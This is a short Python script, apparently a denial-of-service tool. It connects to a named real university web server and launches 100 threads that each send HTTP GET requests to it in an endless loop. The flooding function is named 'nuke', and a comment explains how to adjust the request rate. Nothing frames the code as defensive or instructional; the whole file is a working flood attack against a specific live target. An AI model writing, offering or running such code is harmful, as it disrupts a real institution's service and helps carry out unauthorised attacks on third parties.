import socket
import sys
import threading
import time
num_requests=100
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("jntuh.ac.in", 80))
def nuke():
        while True:
            sock.sendall(bytes("GET / HTTP/1.1\r\nHost: jntuh.ac.in\r\n\r\n","utf-8"))



all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=nuke)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
